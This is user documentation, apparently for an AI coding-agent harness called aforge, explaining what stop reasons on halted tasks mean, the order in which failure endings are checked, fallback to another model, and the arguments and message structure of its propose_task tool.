## What the words and the ! exclamation mark under a stopped task mean — lost the connection, the model provider refused it, went in circles, out of steps, why does it say not accepted under my task, blocked by another task, would not write its notes down

A task that did not finish keeps its branch, and the row under its name on the rail says
**why** it stopped. The same words lead the task's card. They are three kinds of news:

- `stopped — branch kept`, with a `⊘` — **you stopped it** (`x` on its room, `jobs kill`).
  Nothing is wrong with the work; it is on that branch.
- `!` and one of these — **it was halted, and nothing is known to be wrong**. The work can go
  on from its branch: say `continue task 7` or `keep going on task 7`. That is how
  you continue a task instead of running it again: it re-arms the **same** task —
  same id, same brief, same working copy, the last report handed back as this
  round's finding — rather than proposing a new one. It only works in the
  conversation that still holds the graph. A task from another window, an unknown
  id, or a task that is still running cannot be continued here: the tool says
  there is no graph, and names the branch or working copy so it can be read.
  Start a new task that builds on that branch only if the objective itself
  changed.
  - `lost the connection — branch kept`: the connection to the model dropped (a reset, a
    closed socket). The call was retried, and then one more worker was run on the same
    model in the same working copy; this row means both were spent.
  - `the model provider refused it — branch kept`: the provider could not **serve** the
    request at all — the service was down, the route had no provider left, a rate limit was
    still refusing after the retries, or the account could not be served. Nothing was found
    out about the work, and on a run with a budget this does **not** count as part of what
    is still left to do. A model that read the request and **refused** it, and a rejection
    of what the request itself contained, are the provider *answering* — those read
    `ended with an error` and do still count.
  - `went in circles — branch kept`: the worker **repeated itself** and its own loop guard
    ended the turn (its last words are `this turn is going in circles · stopping here
    with anything remaining left undone`). Repetition is the whole of it: the same call
    three times in a row, the same failure three times, the same argument refused twice,
    or five rounds that read nothing new.
  - `blocked by another task — branch kept`: the calls it kept making were writes into a
    working copy another task holds, and every one was refused. Wait for that task's report,
    then run this one again on top of it.
  - `out of steps — branch kept`: a step, no-progress or time limit fired and the work did
    not hold when it was checked.
  - `would not write its notes down — branch kept`: the worker was asked twice to write down
    what it was doing, its tool calls were **held** until it did, and it sent three more
    replies with nothing visible in them — so the turn ended. Whatever it had already done
    is on the branch; the thinking behind it was never written anywhere, which is why the
    run stopped rather than carried on.
- `✗` and one of these — **something was found**, and the report says what:
  - `not accepted — branch kept`: the check named gaps, or you said it was not right on its card.
  - `ended with an error — branch kept`: a working copy could not be made, the worker would
    not start, or an error nobody classified.

**Being quiet is not going in circles**, and a task that was working cannot land here for
it. A worker committing, pushing and writing files says very little, and the `[silent]`
notes that ask it to write its plan down spend none of the loop guard's limit, so no number
of them can make a row say `went in circles`. Neither does a shell command that changed the
working folder: that is counted as work, the same as an `edit` or a `write`.

A worker that ignores those notes twice over is a different story, and it is not this row.
After the second `[silent]` note its tool calls are **held** until it writes something
visible — every call in the reply is answered `[held] Nothing was run this step…` and none
of them runs — and if it sends only tool calls three more times its turn ends with
`stopped here · would not write its notes down, so what this turn worked out is not on the record`.
That is not circling, and the row does not say it is. **It is written up in its own
words**: the rail reads `would not write its notes down — branch kept`, with the same `!`
every halted task wears; the landing note reads
`task 7 would not write its notes down: <title>`; and the record that grades the model on
the work says it was `stopped`, not that it did not finish. The run settles on whatever it
had actually done and the branch is kept like any other. The keys page has the whole ladder
under "Why did aforge stop running tool calls, and what is a [held] answer?".

If a row says `went in circles`, the worker had genuinely stopped making progress, and its
transcript shows what it kept repeating.

The first cause wins: a check that refuses a run which had already given up is written as
`went in circles`, because that is what happened first. A task that lands as `!` is not
`failed` in what it asks of you — it is not asking whether the work is right, it is asking
you to pick it up. A task from before these words existed reads `stopped — branch kept`
whatever ended it.

## What happens when a task fails — my task's world could not be sealed, no working copy could be made

Endings are checked in a fixed order, and the first match wins:

| # | What happened | The report |
| --- | --- | --- |
| 1 | No working copy could be made | `could not prepare a working copy: <err>` |
| 2 | The worker would not start | `could not start the task: <err>` |
| 3 | A step limit fired **and the work did not hold when it was checked** | `stopped: 200 steps and no finish`, `stopped: 6 steps without progress`, or `stopped at repeat checkpoint: <what the second look said>` |
| 4 | The checkpoints ran out | `ran out of time` |
| 5 | You stopped it (`jobs kill`) | `stopped before it finished` |
| 5b | The session closed or detached | paused — it resumes, it is not failed. A sub-harness **design** is the exception: `the design did not finish before aforge closed; nothing was saved` |
| 6 | The connection to the model dropped — a reset, a closed socket — after the call's own retries and one more worker on the same model | `lost the connection to the model: <err>` |
| 6b | The model provider refused the request — an API error, a model that is not there | `it ended with an error: <err>`, and the row reads `the model provider refused it` |
| 6c | The run errored | `it ended with an error: <err>` |
| 7 | Stopped while its work was being looked at | `stopped while its work was being checked` |
| 8 | Nobody could say | `finished, but needs your look — …` |
| 8b | The work held, and a file it wrote changed elsewhere while it ran | `finished, but needs your look — "…" changed <path> while this ran` |
| 9 | Gaps left after the correction rounds | `incomplete — …` |
| 10 | Otherwise | done: the evidence first, then the task's words |

**Row 1 is the FOLDER, not the brief — `this task's world could not be sealed`.** Making a
working copy starts by freezing the folder the task is cut from, and when that will not go
the `<err>` reads `this task's world could not be sealed:` and then git's own words for
why — no repository behind the folder, a locked index, a disk it could not write. Nothing
was wrong with the brief and nothing of the work was attempted: this is the first thing
that happens to a task, before one model call, so **nothing was started and nothing was
spent**. (A brief that describes a world the folder does not have is a different landing —
`its world did not match` — and it has its own section on this page.)

Row 3 is checked before it is written down: a task that hit a limit is judged against its
acceptance one more time, and if the work holds it lands **done** at row 10 instead, merged,
with no `stopped:` line anywhere in the report.

**Row 6 gets one more go, on a different model.** When the worker ended because the
*provider* could not answer — nothing serving the model would take the request, an account
limit, a set of retries the provider never cleared — the task has learned nothing about the
work, and the working copy it prepared is the expensive part. So it **runs again once**, in
the same working copy, on the same brief, on the next model in your `fallback models` row.
Its row says `model <first> could not answer; using <second>` while it runs, and the report
says it either way it ends:

```
openai/gpt-5 stopped answering, so this ran again on openai/gpt-5-mini
```

Three things it deliberately does not do. It never moves for a **tool** that failed — a
failed call is a result the worker reads and goes on from, and it never ends a task. It
never moves for work that is merely **incomplete** — that is what the check said, and
re-rolling a model on it would be guessing at the answer. And it never moves for a reply
that kept **going quiet**, because that turn already moved to another model on its own (see
*Models, context, and what it costs*) and doing it again would spend a whole second worker
learning the same thing.

**Once per task.** The second failure is real, and the report names both models. With no
chain to move to — or under `--one-model` — the task fails on the error it always failed on.
The id the task was **admitted** with is not overwritten by any of this: a rescue is not a
choice somebody made, and picking a model yourself inside the task's own room still outranks
it and clears the line.

In rows 3 to 7 the task's **own last words are kept underneath** the one-line reason, and
the branch is kept — with the work committed onto it. A task that was stopped mid-flight
still hands over the files it produced: they are listed under `changed:` and the branch is
offered for you to merge. What is never done for you is the merge itself, because only work
that was checked reaches your branch.

What you read on a failure is `task 7 failed: <title>`, the report, the changed files, and
the line saying the branch was kept. Anything waiting on that task fails with it — the
cascade walks one layer per scheduling pass.

**This table is about tasks that do work in a working copy.** A `harness` task — a
sub-harness being designed — has none of that machinery and its own short list of endings
instead: it can run out of time only while the page is being *written*, and a card left
unanswered settles it **done** rather than failed. Ask the manual about designing a harness
for that list.

## What propose_task needs from you

`propose_task` is how the model moves a self-contained piece of work out of the
conversation. You cannot call it yourself — you ask for the work, and the model grooms it.

Five arguments are **required**:

| Argument | What it is |
| --- | --- |
| `title` | One line naming the work, as you would say it |
| `summary` | Two or three lines you read to decide whether to redirect it |
| `brief` | The work itself: files, symbols, conventions, what has been tried |
| `deliverable` | What must **exist** when it is over, and where: the file and its path, the branch, the answer and its shape |
| `acceptance` | The observable done-condition: the command that must pass, the behaviour that must hold, the output that must appear |

The same `acceptance` string is what the second look judges against — one text, two
readers. So a vague acceptance costs twice.

A missing argument comes back as an ordinary result, never an error:
`Invalid arguments: title is required`, and the same sentence for `summary`, `brief`,
`deliverable` and `acceptance`, in that order. Unparseable JSON answers
`Invalid arguments: ` and the parse error.

There is a sixth part the model is **not** asked for and cannot leave out: your own
message. See the next section.

## What the task actually reads — does it see what I said?

Yes. Your own message travels with the work, word for word.

A task's first and only message is assembled by aforge from these parts, under headings, in
this order:

```
WHAT THE PERSON ASKED FOR, IN THEIR OWN WORDS
This is the message this work came out of. Where anything below reads
differently from it, their words are what was asked for.

<what you typed, verbatim>

THE WORK
<the model's brief, plus what any task it waits on learned>

WHAT TO PRODUCE
<the deliverable>

DONE WHEN
<the acceptance>

THE PERSON'S ORIGINAL MESSAGE
The restatement above is bounded. Their original words are at this path and line — read them if that is not enough. The brief still governs what ships.

grep or read <journal path>, line <n>
```

The first part is taken by aforge from the conversation — the message that was in front of
the model when it proposed the work, or the newest thing you typed into that turn if you
steered it. The model never writes that part and cannot edit it. The discussion around your
message does not travel with the work, and the task cannot ask you anything once it starts.
When that restatement is not enough, the brief also names where your original words live —
see *Can the task see the original request* below.

**A part with nothing in it gets no heading.** A task you wrote yourself with `/task` has no
separate deliverable, so it reads as your words, the work and a done-condition. A task
restored from a checkpoint written before this existed has no verbatim part at all.

**For a `/task` the THE WORK part is your brief after shaping**, not a model's paraphrase of
a conversation: your sentence with the constraints and decisions written around it, from the
pass described on the *work that runs on its own* page under *Why my task's brief is longer
than what I typed*. Where shaping could not run, the two parts are the same sentence and it
is printed once — under your own heading, with no THE WORK at all.

Long messages are cut at 6000 bytes and the cut is marked with `…`, so a task that was
handed a shortened version of what you said can see that it was. The brief then names the
journal path and line of your original turn, so the worker can read the uncut words itself.

A task the model hands out from **inside** another task inherits the same words: there is
nobody inside a task's own copy to type a new message, so the sentence that started the family is what
every task under it reads.

Once a task is admitted, its brief and its acceptance are **frozen**. Nothing changes them
after that — not steering, not a correction round. Steering is talk to the worker, not a
new target. If the objective itself was wrong, the answer is a new proposal.

## Can the task see the original request — does the task know what I originally said, can a task read my full message when the brief is cut

Yes. The brief is still the contract — the task is not handed this conversation — but it is
handed an address: the filesystem path of the session journal and the line where your turn
began. The worker already has `read` and `grep`, so that pointer is enough.

The last section of its opening message, when the address is known, is:

```
THE PERSON'S ORIGINAL MESSAGE
The restatement above is bounded. Their original words are at this path and line — read them if that is not enough. The brief still governs what ships.

grep or read /home/x/.aforge/v3/sessions/abc.jsonl, line 12
```

The restatement under `WHAT THE PERSON ASKED FOR, IN THEIR OWN WORDS` is bounded at 6000
bytes. A long or nuanced ask can be cut, and the cut is marked with `…`. The pointer is the
recourse: the worker may open that path at that line and read what you actually typed. What
it must ship is still what the brief says.

**An empty pointer draws nothing.** A standing order that fired with no person turn behind
it, or a task restored from a checkpoint written before this existed, has no origin
section. Unknown is absent, not a guessed path.

A task handed out from inside another task, and every part of a division, inherit the same
pointer — they still point at your turn, never at the parent task's own journal.

## The optional arguments on propose_task

Four more arguments, all optional. Every bad value is an ordinary result, not an error.

**`depends_on`** — an array of task ids that must finish first. The task waits for them,
and their reports are put in front of it when it starts — every one of them, bounded
and counted as the section above on work that needs your look says. Ids can only point backwards,
and only ids `propose_task` itself returned count: a job or adaptive-run number is a
different kind of work, and naming one — or a task that already failed — refuses the
proposal on the spot instead of queueing work that could never start.

**`model`** — which model this task runs on. Set only when you asked for a particular model
or class of model for this work. Left out, the task runs on `task.model` if set, otherwise
on whatever model the conversation is on at the moment of admission — settled once, then
frozen for the task's whole life.

**`max_steps`** — how many finished tool calls make one checkpoint. Default **200**. At a
checkpoint a second look at the evidence decides: progress buys another 200 (up to 1000 in
all), circling gets a landing turn — the task writes the deliverable from what it has —
and only then a stop with `stopped: 200 steps and no finish`, the number being the
checkpoint that was in force. A negative value answers `Invalid arguments: max_steps cannot
be negative`. Zero or absent means the default.

**`no_progress`** — how many tool calls in a row may teach nothing, ask nothing new, save nothing and leave
nothing new in its working copy before the task is stopped as spinning. Default **6**. On the
limit the report is `stopped: 6 steps without progress`, the landing turn runs, and what
the task made is committed onto its kept branch. A negative value answers
`Invalid arguments: no_progress cannot be negative`.

The same number is also **how many calls in a row may produce byte-identical content before
the second look is asked about it** — the repeat checkpoint above. That one stops nothing on
its own: raising `no_progress` for work that is legitimately repetitive moves both.

Both step limits are recorded in the checkpoint, so they survive a restart along with the
rest of the task.
